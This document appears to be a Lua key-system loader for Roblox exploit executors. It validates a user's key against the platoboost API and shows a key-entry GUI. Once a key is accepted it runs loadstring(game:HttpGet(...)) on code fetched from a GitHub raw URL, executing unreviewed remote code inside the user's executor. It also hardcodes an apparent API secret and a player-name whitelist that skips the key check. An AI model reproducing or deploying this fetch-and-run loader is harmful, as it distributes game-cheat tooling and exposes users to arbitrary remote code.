local service, host, useNonce = 3316, "https://api.platoboost.com", true
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ArchivoClaveGuardada = "jses_syn"
local secret = "e765fff9-ce55-4772-8eb0-e16c63b363ae";  


local fSetClipboard, fRequest, fGetHwid = 
    setclipboard or toclipboard, 
    request or http_request or syn.request, 
    gethwid or function() return Players.LocalPlayer.UserId end

local function log(...) print("[KeySystem]", ...) end

local function generateNonce()
    return string.gsub(HttpService:GenerateGUID(false), "-", ""):sub(1, 16)
end

local function makeRequest(url, method, body)
    return fRequest({
        Url = url,
        Method = method,
        Headers = {["Content-Type"] = "application/json"},
        Body = body and HttpService:JSONEncode(body) or nil
    })
end

local function generateLink()
    for _, currentHost in ipairs({host, "https://api.platoboost.net"}) do
        local response = makeRequest(currentHost .. "/public/start", "POST", {
            service = service, 
            identifier = fGetHwid(),
            timestamp = os.time(),
            random = math.random()
        })
        
        if response and response.StatusCode == 200 then
            local decoded = HttpService:JSONDecode(response.Body)
            if decoded.success and decoded.data and decoded.data.url then
                return decoded.data.url
            end
        end
    end
    return nil
end

local function verificarClave(clave)
    local identifier = fGetHwid()
    local nonce = useNonce and generateNonce() or nil
    
    for _, currentHost in ipairs({host, "https://api.platoboost.net"}) do
        local whitelistUrl = string.format("%s/public/whitelist/%d?identifier=%s&key=%s%s",
            currentHost, service, HttpService:UrlEncode(identifier), 
            HttpService:UrlEncode(clave), nonce and "&nonce="..nonce or "")
        
        local whitelistResponse = makeRequest(whitelistUrl, "GET")
        
        if whitelistResponse and whitelistResponse.StatusCode == 200 then
            local decoded = HttpService:JSONDecode(whitelistResponse.Body)
            if decoded.success and decoded.data and decoded.data.valid then
                writefile(ArchivoClaveGuardada, HttpService:JSONEncode({clave = clave, fecha = os.time()}))
                return true
            end
        end
        
        local redeemResponse = makeRequest(currentHost .. "/public/redeem/" .. service, "POST", {
            identifier = identifier,
            key = clave,
            nonce = nonce
        })
        
        if redeemResponse and redeemResponse.StatusCode == 200 then
            local decoded = HttpService:JSONDecode(redeemResponse.Body)
            if decoded.success then
                writefile(ArchivoClaveGuardada, HttpService:JSONEncode({clave = clave, fecha = os.time()}))
                return true
            end
        end
    end
    return false
end

local jugadoresPremio = {
    "1", "2", 
    "3", "4", "5"
}

local function claveEsValida()
    if table.find(jugadoresPremio, Players.LocalPlayer.Name) then
        return true
    end

    if isfile(ArchivoClaveGuardada) then
        local datos = HttpService:JSONDecode(readfile(ArchivoClaveGuardada))
        if datos and datos.clave and verificarClave(datos.clave) then
            return true
        end
        delfile(ArchivoClaveGuardada)
    end
    return false
end

local function script()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/hurgbdy/SBteam/refs/heads/main/lua', true))()

end

local function crearGUI()
    local KeyGui = Instance.new("ScreenGui", game.CoreGui)
    local Frame = Instance.new("Frame", KeyGui)
    Frame.Size, Frame.Position = UDim2.new(0.318, 0, 0.318, 0), UDim2.new(0.5, 0, 0.5, 0)
    Frame.AnchorPoint, Frame.BackgroundColor3 = Vector2.new(0.5, 0.5), Color3.fromRGB(40, 42, 48)

    local TextBox = Instance.new("TextBox", Frame)
    TextBox.Size, TextBox.Position = UDim2.new(0.9, 0, 0.13, 0), UDim2.new(0.05, 0, 0.28, 0)
    TextBox.PlaceholderText, TextBox.Font = "Introduce tu clave aquÃ­", Enum.Font.Gotham
    TextBox.TextColor3, TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255), Color3.fromRGB(50, 53, 60)
    TextBox.TextSize = 18
    TextBox.BorderSizePixel = 2
    TextBox.BorderColor3 = Color3.fromRGB(85, 85, 85)

    local function crearBoton(texto, posX, color)
        local boton = Instance.new("TextButton", Frame)
        boton.Size, boton.Position = UDim2.new(0.4, 0, 0.15, 0), UDim2.new(posX, 0, 0.65, 0)
        boton.Text, boton.Font, boton.TextColor3 = texto, Enum.Font.GothamBold, Color3.new(1, 1, 1)
        boton.BackgroundColor3 = color
        boton.TextSize = 18
        boton.BorderSizePixel = 0
        boton.AutoButtonColor = true
        
        -- Ajout d'une animation au survol
        boton.MouseEnter:Connect(function()
            boton.BackgroundColor3 = color:Lerp(Color3.fromRGB(255, 255, 255), 0.3)
        end)
        boton.MouseLeave:Connect(function()
            boton.BackgroundColor3 = color
        end)

        return boton
    end

    local BotonVerificar = crearBoton("check the key", 0.05, Color3.fromRGB(0, 204, 122))
    local BotonCopiar = crearBoton("Generate a key", 0.55, Color3.fromRGB(0, 122, 204))

    -- Fonction de clic du bouton "Verificar Clave"
    BotonVerificar.MouseButton1Click:Connect(function()
        local clave = TextBox.Text
        if clave == "" then
            TextBox.Text, TextBox.TextColor3 = "In Put Your Key", Color3.fromRGB(255, 100, 100)
            return
        end

        TextBox.Text, TextBox.TextColor3 = "verification in progress...", Color3.new(1, 1, 1)

        if verificarClave(clave) then
            TextBox.Text, TextBox.TextColor3 = "Valid Key", Color3.fromRGB(100, 255, 100)
            wait(1)
            KeyGui:Destroy()
            script()
        else
            TextBox.Text, TextBox.TextColor3 = "Invalid Key", Color3.fromRGB(255, 100, 100)
        end
    end)

    -- Fonction de clic du bouton "Generar Link"
    BotonCopiar.MouseButton1Click:Connect(function()
        TextBox.Text, TextBox.TextColor3 = "Generating link...", Color3.new(1, 1, 1)

        local link = generateLink()
        if link then
            TextBox.Text, TextBox.TextColor3 = "Link generated and copied", Color3.fromRGB(100, 255, 100)
            if fSetClipboard then fSetClipboard(link) end
        else
            TextBox.Text, TextBox.TextColor3 = "The link could not be generated", Color3.fromRGB(255, 100, 100)
        end
    end)
end


if claveEsValida() then
    log("Valid key detected. Running main script.")
    script()
else
    if makeRequest(host .. "/public/connectivity", "GET").StatusCode == 200 then
        crearGUI()
    else
        log("Service unavailable. The GUI cannot be displayed.")
    end
end
